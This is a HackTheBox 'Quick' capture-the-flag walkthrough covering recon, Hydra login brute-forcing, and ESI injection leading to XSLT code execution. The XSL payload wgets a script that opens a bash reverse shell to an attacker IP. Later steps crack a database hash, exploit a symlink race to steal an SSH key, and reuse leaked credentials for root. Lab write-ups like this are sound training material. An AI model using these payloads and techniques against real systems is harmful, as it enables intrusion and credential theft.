---
title: "HackTheBox: Quick | Walkthrough"
date: 2020-10-17
tags: [HackTheBox, CTF, RCE, PrivEsc, Linux, HTTP3, SQL, ESI, Web]
categories: [hackthebox]
---


## Recon

```bash
export ipaddress=10.10.10.186
ports=$(nmap -p- --min-rate=1000 -T4 $ipaddress | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -A -p$ports $ipaddress -o nmap
```

**Nmap output:**

```
# Nmap 7.80 scan initiated Thu Apr 30 00:00:37 2020
Nmap scan report for 10.10.10.186
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Quick | Broadband Services
```

**UDP scan:**

```bash
nmap -sU -o udp.nmap -T4 -p80,443,9001 10.10.10.186
```

```
PORT     STATE         SERVICE
80/udp   closed        http
443/udp  open|filtered https
9001/udp closed        etlservicemgr
```

Add hostnames:

```bash
vi /etc/hosts
# Add:
10.10.10.186 portal.quick.htb quick.htb
```

---

## Enumeration

Content discovery with ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://quick.htb:9001/FUZZ -e .php
```

**Results:**

```
clients.php
db.php
home.php
index.php
login.php
search.php
server-status
ticket.php
```

* `server-status` reveals Apache 2.4.29 (Ubuntu), MPM: prefork.
* Other pages: empty responses or JS “invalid credentials”.
* Emails found on about page:

  ```
  jane@quick.htb
  mike@quick.htb
  john@quick.htb
  ```

---

## QUIC Access

Use Docker container for HTTP3 curl:

```bash
docker pull ymuski/curl-http3
docker run -it ymuski/curl-http3 bash
curl --http3 https://portal.quick.htb/
```

**HTML received:**

```html
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
```

* Contact page → simple form
* About page → emails
* Docs page → PDFs: `QuickStart.pdf` & `Connectivity.pdf`

Download PDFs:

```bash
curl --http3 https://portal.quick.htb/docs/QuickStart.pdf -O QuickStart.pdf
curl --http3 https://portal.quick.htb/docs/Connectivity.pdf -O Connectivity.pdf
```

* Password found in `Connectivity.pdf`: `Quick4cc3$$`

---

## Login Bruteforce

Users list (`users.txt`):

```
john@quick.htb
jane@quick.htb
mike@quick.htb
tim@qconsulting.co.uk
roy@darkwingsolutions.com
elisa@wink.co.uk
james@lazycoop.cn
```

Password list (`passwd.txt`):

```
Quick4cc3$$
```

Run **Hydra**:

```bash
hydra -L users.txt -P passwd.txt -s 9001 quick.htb http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid"
```

**Result:**

```
[9001][http-post-form] host: quick.htb   login: elisa@wink.co.uk   password: Quick4cc3$$
```

* Login successful → portal has search and ticket creation functionality.

---

## ESI Injection – RCE

* `X-Powered-By: Esigate` → vulnerable to ESI injection
* Payload:

```xml
<esi:include src="http://10.10.14.25/test" />
```

* Serve XSL stylesheet with reverse shell via Sinatra:

```ruby
require 'sinatra'
get '/*' do
  File.read('test.xsl')
end
```

`test.xsl`:

```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
  <xsl:variable name="cmd"><![CDATA[wget 10.10.14.25:8000/abhizer.sh]]></xsl:variable>
  <xsl:variable name="rtObj" select="rt:getRuntime()"/>
  <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
  Process: <xsl:value-of select="$process"/>
  Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

`abhizer.sh`:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
```

* Search ticket to trigger stylesheet → reverse shell obtained as `sam@quick`.

---

## Privilege Escalation – Database Enumeration

Printer DB credentials (`/var/www/printer/db.php`):

```php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
```

Connect to MySQL:

```bash
mysql -u db_adm -p quick
# password: db_p4ss
```

**Databases:**

```sql
show databases;
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
```

**Tables in `quick`:**

```sql
use quick;
show tables;
+--------+
| Tables |
+--------+
| jobs   |
| tickets|
| users  |
+--------+
```

**Jobs table:**

```sql
describe jobs;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| title | varchar(100) | YES  |     | NULL    |       |
| ip    | varchar(100) | YES  |     | NULL    |       |
| port  | varchar(100) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
```

**Tickets table:**

```sql
describe tickets;
+-------------+---------------+------+-----+---------+-------+
| Field       | Type          | Null | Key | Default | Extra |
+-------------+---------------+------+-----+---------+-------+
| id          | varchar(100)  | YES  |     | NULL    |       |
| title       | varchar(100)  | YES  |     | NULL    |       |
| description | varchar(1000) | YES  |     | NULL    |       |
| status      | varchar(100)  | YES  |     | NULL    |       |
+-------------+---------------+------+-----+---------+-------+
```

**Users table:**

```sql
select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
```

* Password hash for `Server Admin` cracked using Python:

```python
#!/usr/bin/python3
import hashlib, crypt

with open("rockyou.txt","r", encoding="latin-1") as file:
    for line in file:
        newhash = hashlib.md5(crypt.crypt(line.strip(),'fa').encode()).hexdigest()
        if newhash == 'e626d51f8fbfd1124fdea88396c35d05':
            print('Password cracked:', line.strip())
            break
```

**Password:** `yl51pbx` → used on printer site.

---

## Printer Race Condition → SSH Key

* Job description writes file, then reads → race condition exploitable.
* Bash script:

```bash
while true; do
  file=$(ls /var/www/jobs)
  if [[ ! -z "$file" ]]; then
    ln -sF /home/srvadm/.ssh/id_rsa /var/www/jobs/$file
    break
  fi
done
```

* Execute job → captured `srvadm` private key.

SSH access:

```bash
ssh -i srvadm.id_rsa srvadm@quick.htb
```

---

## Root

* `.cache/conf.d/printers.conf` contains encoded credentials:

```
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
```

* URL decoded: `srvadm@quick.htb:&ftQ4K3SGde8?`

SSH as root:

```bash
ssh root@quick.htb
# password: &ftQ4K3SGde8?
```

**Rooted!**

